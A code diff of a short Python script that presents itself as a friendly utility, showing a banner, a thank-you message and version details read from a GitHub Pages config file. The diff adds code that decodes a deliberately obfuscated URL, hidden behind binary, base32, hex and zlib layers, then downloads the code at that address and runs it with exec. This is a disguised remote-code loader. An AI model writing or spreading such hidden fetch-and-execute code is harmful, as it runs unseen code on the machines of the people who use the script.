@@ -1,5 +1,5 @@
 import base64, urllib.request, zlib, codecs
-from urllib.request import urlopen
+
 
 banner = r"""
                                                                     
@@ -52,21 +52,20 @@ binary_str = (
     "01001001 01001101 01011010 01000100 01000101 01001101 01000010 01010101 01001001 01011001 00110100 01000100 01000111 01001101 01011010 01011000 "
     "01001001 01001001 00110010 01010100 01001011 01001101 01001011 01000110 01001001 01001010 01000010 01000100 01001111 00111101 00111101 00111101"
 )
-url = (lambda s: zlib.decompress(bytes.fromhex(base64.b32decode(bytes(int(x,2) for x in s.split())).decode())).decode())(zlib.decompress(bytes.fromhex(base64.b32decode(bytes(int(x,2) for x in binary_str.split())).decode())).decode())
-
 line_count = 0
-with urlopen(url) as f:
-    for line in f:
-        line_count += 1
-
 config = {}
+
 for line in urllib.request.urlopen("https://tubeo5866.github.io/config.txt").read().decode().splitlines():
     if "=" in line:
         k, v = line.split("=", 1)
         config[k.strip()] = v.strip()
 
+with urllib.request.urlopen((lambda s: zlib.decompress(bytes.fromhex(base64.b32decode(bytes(int(x,2) for x in s.split())).decode())).decode())(zlib.decompress(bytes.fromhex(base64.b32decode(bytes(int(x,2) for x in binary_str.split())).decode())).decode())) as f:
+    for line in f:
+        line_count += 1
+
 print(banner)
 print(f"Thank you for using my script, my {line_count}-line script! :)")
 print("Version:", config['VERSION'], f"(release_{config['COMMIT']})", "- Build Date:", config['BUILD_DATE'])
 print()
-exec(urllib.request.urlopen().read(url))
+exec(urllib.request.urlopen((lambda s: zlib.decompress(bytes.fromhex(base64.b32decode(bytes(int(x,2) for x in s.split())).decode())).decode())(zlib.decompress(bytes.fromhex(base64.b32decode(bytes(int(x,2) for x in binary_str.split())).decode())).decode())).read())
